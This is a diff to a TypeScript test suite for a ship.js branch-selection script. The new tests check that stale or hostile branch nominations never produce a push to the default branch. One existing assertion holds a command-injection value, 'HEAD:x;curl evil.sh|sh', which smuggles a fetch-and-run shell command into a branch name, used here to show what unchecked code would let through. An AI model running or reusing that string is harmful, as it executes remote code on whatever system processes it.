@@ -65,14 +65,24 @@ const DECISION_SIGNATURE = "function reusablePriorBranch(prior) {";
  * `.claude/rules/checks-must-be-able-to-fail.md` names as its fourth shape.
  * Slicing means a change to the real predicate changes what these rows run.
  */
-const SAFE_BRANCH_SOURCE = (() => {
-  const start = shipSource.indexOf("const SAFE_BRANCH =");
-  const body = shipSource.indexOf("function isSafeBranchName(name) {");
-  if (start === -1 || body === -1) throw new Error("ship.js is missing isSafeBranchName");
-  const end = shipSource.indexOf("\n}", body);
-  if (end === -1) throw new Error("ship.js's isSafeBranchName has no closing brace");
+function sliceDeclaration(from: string, label: string): string {
+  const start = shipSource.indexOf(from);
+  if (start === -1) throw new Error(`ship.js no longer declares ${label}`);
+  const end = shipSource.indexOf("\n}", start);
+  if (end === -1) throw new Error(`ship.js's ${label} has no closing brace`);
   return shipSource.slice(start, end + 2);
-})();
+}
+
+const SAFE_BRANCH_SOURCE = [
+  sliceDeclaration("const SAFE_BRANCH =", "isSafeBranchName"),
+  sliceDeclaration("function bareBranchName(ref) {", "bareBranchName"),
+  // One line, so it has no closing brace of its own.
+  (() => {
+    const line = shipSource.split("\n").find(l => l.startsWith("const DEFAULT_BRANCHES ="));
+    if (!line) throw new Error("ship.js no longer declares DEFAULT_BRANCHES");
+    return line;
+  })(),
+].join("\n");
 
 /**
  * The mutation: the decision collapses to what ship.js did before #185 —
@@ -113,10 +123,22 @@ interface PushTargetOutcome {
 }
 
 /** Execute one copy of the block over a prior-branch nomination. */
-function runBlock(block: string, prior: unknown): PushTargetOutcome {
+function runBlock(
+  block: string,
+  prior: unknown,
+  /**
+   * The branch the project checkout was on at launch. `reusablePriorBranch`
+   * refuses a nomination equal to it, which is how a consumer whose default
+   * branch is neither `main` nor `master` is covered (#1113). Defaults to a
+   * work branch, so the rows below measure the `DEFAULT_BRANCHES` half unless
+   * they say otherwise.
+   */
+  primaryBranchBefore = "185-deep-modules-checkout",
+): PushTargetOutcome {
   const logs: string[] = [];
   const scope: Record<string, unknown> = {
     priorBranchResult: prior,
+    primaryBranchBefore,
     log: (m: unknown) => logs.push(String(m)),
   };
   const sandbox = new Proxy(scope, {
@@ -188,6 +210,56 @@ describe("ship.js: a stale prior branch is not a push target (#185)", () => {
     // verbatim, which is what main does today.
     const mutant = runBlock(buildMutantBlock(), HOSTILE);
     expect(mutant.pushTarget).toBe("HEAD:x;curl evil.sh|sh");
+  });
+
+  test("a nomination of the default branch composes no push to it (#1113)", () => {
+    // The cheapest wrong fix for #1103 is the one that shipped, and it is a
+    // row rather than an apology: `isSafeBranchName('main')` is TRUE, so the
+    // first version of the hoist let `{branch: 'main', isMerged: false,
+    // isBehind: false}` straight through to `HEAD:main`. A test asserting
+    // that `isSafeBranchName` is CALLED passes against a tree that pushes to
+    // main — which is why this row reads the composed target instead.
+    const MAIN = { ...CURRENT, branch: "main" };
+    const out = runBlock(PUSH_TARGET_BLOCK, MAIN);
+
+    // Not "composed differently" — the branch is not named in anything this
+    // block produces. `HEAD:main`, `main`, and any other spelling of it fail
+    // this line together.
+    expect(`${out.branchToReuse ?? ""} ${out.pushTarget}`).not.toContain("main");
+    expect(out.pushTarget).toBe("HEAD");
+
+    // The removal, performed: without the check the push target is the
+    // default branch, which is #136 with a green suite over it.
+    expect(runBlock(buildMutantBlock(), MAIN).pushTarget).toBe("HEAD:main");
+  });
+
+  test("the fully-qualified spellings of the default branch are the same case", () => {
+    // `HEAD:refs/heads/main` reaches the same place, and `isSafeBranchName`
+    // accepts it — SAFE_BRANCH allows `/`. Normalise, then compare.
+    for (const branch of ["refs/heads/main", "origin/main", "refs/remotes/origin/main", "master"]) {
+      const out = runBlock(PUSH_TARGET_BLOCK, { ...CURRENT, branch });
+      expect(out.pushTarget, `"${branch}" reached the push target`).toBe("HEAD");
+      expect(`${out.branchToReuse ?? ""} ${out.pushTarget}`).not.toContain("main");
+    }
+    // A fully-qualified ref is refused even when it is NOT the default
+    // branch: the push target is a bare name, and `HEAD:refs/heads/x` is a
+    // different string arriving at the same argument.
+    expect(runBlock(PUSH_TARGET_BLOCK, { ...CURRENT, branch: "refs/heads/254-fix" }).pushTarget).toBe("HEAD");
+  });
+
+  test("a consumer whose default branch is neither main nor master is covered", () => {
+    // `DEFAULT_BRANCHES` cannot know a downstream project's default. The
+    // branch the checkout was on when this run launched can, and it is the
+    // #136 fact in the first place.
+    const out = runBlock(PUSH_TARGET_BLOCK, { ...CURRENT, branch: "develop" }, "develop");
+    expect(out.pushTarget).toBe("HEAD");
+
+    // The control: the same nomination is reused when it is NOT what the
+    // checkout sits on, or this row would be refusing every branch named
+    // develop everywhere.
+    expect(runBlock(PUSH_TARGET_BLOCK, { ...CURRENT, branch: "develop" }, "main").pushTarget).toBe(
+      "HEAD:develop",
+    );
   });
 
   test("the shape check refuses the near misses, and passes the branch names this repo uses", () => {
